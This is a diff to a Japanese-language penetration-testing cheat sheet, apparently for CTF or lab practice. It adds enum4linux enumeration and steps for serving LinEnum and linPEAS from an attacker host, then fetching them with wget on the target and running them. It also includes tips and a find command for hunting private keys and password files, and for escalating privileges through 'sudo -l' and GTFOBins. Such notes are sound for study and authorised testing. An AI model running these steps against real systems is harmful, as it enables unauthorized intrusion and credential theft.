@@ -205,6 +205,30 @@ DirList
 * /usr/share/wordlists/dirb/common.txt
 * /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 
+=== Enumeration
+
+==== enum4linux
+
+----
+enum4linux -a [TargetIP] | tee ./enum4linux.log
+----
+
+==== link:https://github.com/rebootuser/LinEnum[LinEnum]
+
+----
+# 攻撃者側
+cd /var/tmp
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+python3 -m http.server [MyHostPort]
+
+# ターゲット側
+cd /var/tmp
+which wget
+wget [MyHostIP]:[MyHostPort]/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+----
+
 === Steganography
 
 ----
@@ -431,13 +455,35 @@ chmod 600 id_rsa
 
 ==== Scripts
 
-. https://github.com/lucyoa/kernel-exploits
-. https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
-. https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack
-. https://github.com/rebootuser/LinEnum
+* link:https://github.com/lucyoa/kernel-exploits[kernel-exploits by lucyoa]
+* link:https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack[Unix-Privilege-Escalation-Exploits-Pack by Kabot]
+* link:https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite[PEASS by carlospolop]
+
+==== link:https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite[PEASS]
+
+===== linPEAS
+
+----
+# 攻撃者側
+cd /var/tmp
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+python3 -m http.server [MyHostPort]
+
+# ターゲット側 
+cd /var/tmp
+wget http://[MyHostIP]:[MyHostPort]/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+----
+
+===== winPEAS
+
+★coming soon
 
 ==== 攻撃・防御のコツ
 
+* id_rsaファイルや、RSAプライベートキーに当たる内容がないかfindコマンドで探す
+* 「sudo -l」にて、特権で使えるコマンドを列挙し、当該コマンドのうち特権昇格できる方法をlink:https://gtfobins.github.io[GTFOBins]で探す
 * ターゲット側でスクリプトを実行する際は、 +
 使っているユーザ権限で自由にファイル授受できるディレクトリに移動するとよい。
 +
@@ -472,37 +518,6 @@ tor、串、over ssh、ログ削除、rootで行動、と他には何がある�
 +
 ----
 find /  -iname "*pwd*" -or -iname "*pass*" -or -iname "*secret*" -or -name "id_rsa" 2>/dev/null
-----
-
-==== LinPEAS
-
-----
-# 攻撃者側
-cd /var/tmp
-wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
-python3 -m http.server [MyHostPort]
-
-# ターゲット側 
-cd /var/tmp
-wget http://[MyHostIP]:[MyHostPort]/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
-----
-
-==== LinEnum
-
-----
-# 攻撃者側
-cd /var/tmp
-wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-python3 -m http.server [MyHostPort]
-
-# ターゲット側
-cd /var/tmp
-which wget
-wget [MyHostIP]:[MyHostPort]/LinEnum.sh
-chmod +x LinEnum.sh
-./LinEnum.sh
 ----
 
 == 情報元
